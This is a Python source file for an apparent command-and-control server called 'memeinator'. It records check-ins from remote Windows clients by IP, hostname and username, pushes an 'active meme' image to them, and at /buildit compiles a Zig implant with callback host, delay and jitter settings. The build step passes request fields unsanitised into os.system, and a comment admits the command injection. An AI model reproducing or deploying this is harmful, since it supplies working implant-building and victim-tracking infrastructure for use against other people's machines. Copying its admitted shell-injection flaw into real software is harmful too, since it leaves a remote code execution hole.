import argparse
import base64
import datetime
import http.server
import json
import os
import pathlib
import re
import socket
import socketserver
import threading
import zlib

from functools import partial

RE_CLEAN_HEADER = re.compile(r"[^a-zA-Z0-9\s]")
TMP_MEME_PATH = pathlib.PosixPath("/tmp/active_meme.png")
BASEPATH = pathlib.PosixPath(__file__).parent
REQUEST_TRACKER = {}


def find_images_in_directory(directory):
    """
    Walk through the directory and return a list of image file paths.
    """
    image_files = []
    valid_extensions = ".png"

    for file in directory.rglob("*"):
        if file.suffix.lower() in valid_extensions and file.is_file():
            image_files.append(str(file))

    return image_files


class ReusableTCPServer(socketserver.TCPServer):
    def server_bind(self):
        self.socket = socket.socket(self.address_family, self.socket_type)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(self.server_address)


class ClientHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    """
    This is the 'public' facing portion of the script - the client uses this API
    """

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_GET(self):
        global REQUEST_TRACKER
        remote_ip = self.client_address[0]

        if not REQUEST_TRACKER.get(remote_ip, False):
            REQUEST_TRACKER[remote_ip] = {}

        username = ""
        hostname = ""

        for header, value in self.headers.items():
            if header.lower().strip() == "x-proxy-user":
                username = RE_CLEAN_HEADER.sub("", value)[0:20]
            if header.lower().strip() == "x-proxy-host":
                hostname = RE_CLEAN_HEADER.sub("", value)[0:20]

        if username and hostname:

            if not REQUEST_TRACKER[remote_ip].get(hostname, False):
                REQUEST_TRACKER[remote_ip][hostname] = {}

            REQUEST_TRACKER[remote_ip][hostname][username] = datetime.datetime.now(
                datetime.UTC
            ).strftime("%Y-%m-%dT%H:%M:%S.000Z")

            if TMP_MEME_PATH.exists():
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(zlib.compress(TMP_MEME_PATH.read_bytes(), level=5))
                return

        self.send_error(404, "Not found")

    def list_directory(self, path):
        self.send_error(404, "Not found")


class APIHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    """
    This is the user facing portion of the server - trust those with whome tis exposed
    """

    def __init__(self, *args, api_image_directory, **kwargs):
        self.api_image_directory = pathlib.PosixPath(api_image_directory)

        with open("index.html", "rb") as fh:
            self.index_html = fh.read()

        super().__init__(*args, **kwargs)

    def do_GET(self):
        global REQUEST_TRACKER

        if self.path == "/status":
            response = []

            for ip, hosts in REQUEST_TRACKER.items():
                for hostname, users in hosts.items():
                    for username, timestamp in users.items():
                        response.append(
                            {
                                "ip": ip,
                                "hostname": hostname,
                                "username": username,
                                "timestamp": timestamp,
                            }
                        )

            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())

        elif self.path == "/" or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(self.index_html)

        elif (
            self.path.startswith(f"/{self.api_image_directory}/")
            and len(self.path) > len(str(self.api_image_directory)) + 2
        ):
            parts = self.path.split("/")

            if len(parts) == 3:

                filepath = self.api_image_directory / parts[-1]

                if filepath.exists(follow_symlinks=False):
                    self.send_response(200)
                    self.send_header("Content-type", "image/png")
                    self.end_headers()
                    self.wfile.write(filepath.read_bytes())
                    return

            self.send_response(404)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"")

        elif self.path.startswith("/static/") and len(self.path) > 6:
            parts = self.path.split("/")

            if len(parts) == 3:
                filename = parts[-1]

                filepath = pathlib.PosixPath(f"static/{filename}")

                if filepath.exists(follow_symlinks=False):
                    self.send_response(200)

                    if filename.endswith(".js"):
                        self.send_header("Content-type", "text/javascript")
                    elif filename.endswith(".css"):
                        self.send_header("Content-type", "text/css")

                    self.end_headers()
                    self.wfile.write(filepath.read_bytes())
                    return

            self.send_response(404)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"")

        elif self.path == "/list_images":
            response = find_images_in_directory(self.api_image_directory)
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
        else:
            self.send_error(404, "Not Found")

    def do_POST(self):
        if self.path == "/set_active_meme":
            content_length = int(self.headers["Content-Length"])
            post_data = self.rfile.read(content_length)

            try:
                if post_data.startswith(b"data:image/png;base64,"):
                    post_data = post_data[len(b"data:image/png;base64,") :]

                image_bytes = base64.b64decode(post_data)

                TMP_MEME_PATH.unlink(missing_ok=True)
                TMP_MEME_PATH.write_bytes(image_bytes)

                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"done": True}).encode())

            except Exception as e:
                response = {
                    "status": "error",
                    "message": f"Failed to upload image: {str(e)}",
                }
                self.send_response(400)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(response).encode())
        elif self.path == "/buildit":
            try:
                content_length = int(self.headers["Content-Length"])
                post_data = json.loads(self.rfile.read(content_length))

                background = post_data.get("background")
                url = post_data.get("url")

                delay = post_data.get("delay")
                jitter = post_data.get("jitter")
                build_os = post_data.get("os")  # TODO: implement?
                flavor = post_data.get("flavor")  # TODO: implement - dll?

                # yes - there is command injection here - PR or fuck off...
                os.system(
                    f'cd {BASEPATH}/client && zig build -Doptimize=ReleaseSmall -Dcallback_host="{url}" -Dhost_background_path="{background}" -Dcallback_delay="{delay}" -Dcallback_jitter="{jitter}" --release=small'
                )

                artifact = pathlib.PosixPath(
                    f"{BASEPATH}/client/zig-out/x86_64-windows-msvc/memeinator.zig-MSVC-x86_64-release.{flavor}"
                )

                if artifact.exists():
                    self.send_response(200)
                    self.send_header("Content-type", "application/octet-stream")
                    self.end_headers()
                    self.wfile.write(artifact.read_bytes())
                else:
                    response = {
                        "status": "error",
                        "message": "Failed to build client",
                    }
                    self.send_response(400)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps(response).encode())
            except Exception as e:
                response = {
                    "status": "error",
                    "message": f"Failed to upload image: {str(e)}",
                }
                self.send_response(400)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(response).encode())
        else:
            self.send_error(404, "Not Found")

    def list_directory(self, path):
        self.send_error(404, "Not Found")


def run_main_server(ip="0.0.0.0", port=8080):
    handler = partial(ClientHTTPRequestHandler)

    with ReusableTCPServer((ip, port), handler) as httpd:
        print(f"Main Server running on http://{ip}:{port}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("Main Server shutdown gracefully.")
            httpd.shutdown()


def run_api_server(ip="127.0.0.1", port=8081, api_dir=None):
    handler = partial(
        APIHTTPRequestHandler,
        api_image_directory=api_dir,
    )

    with ReusableTCPServer((ip, port), handler) as httpd:
        print(f"API Server running on http://{ip}:{port}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("API Server shutdown gracefully.")
            httpd.shutdown()


# Run both servers in separate threads
def run_servers(client_ip, client_port, api_ip, api_port, api_dir):
    main_server_thread = threading.Thread(
        target=run_main_server, args=(client_ip, client_port), daemon=True
    )

    api_server_thread = threading.Thread(
        target=run_api_server, args=(api_ip, api_port, api_dir), daemon=True
    )

    main_server_thread.start()
    api_server_thread.start()

    try:
        main_server_thread.join()
    except KeyboardInterrupt:
        print("\nReceived shutdown signal (Ctrl+C). Shutting down servers...")


def entry():
    os.chdir(str(BASEPATH))

    parser = argparse.ArgumentParser(description="Run image serving and API server.")
    parser.add_argument(
        "--client-server-ip",
        type=str,
        default="0.0.0.0",
        help="Client server IP address.",
    )
    parser.add_argument(
        "--client-server-port",
        type=int,
        default=8080,
        help="Client server port.",
    )
    parser.add_argument(
        "--api-server-ip",
        type=str,
        default="127.0.0.1",
        help="API server IP address.",
    )
    parser.add_argument(
        "--api-server-port",
        type=int,
        default=8081,
        help="API server port.",
    )
    parser.add_argument(
        "--api-image-directory",
        type=str,
        default=f"{BASEPATH}/api_images",
        help="Directory for API image listing.",
    )

    args = parser.parse_args()

    run_servers(
        client_ip=args.client_server_ip,
        client_port=args.client_server_port,
        api_ip=args.api_server_ip,
        api_port=args.api_server_port,
        api_dir=args.api_image_directory,
    )


if __name__ == "__main__":
    entry()
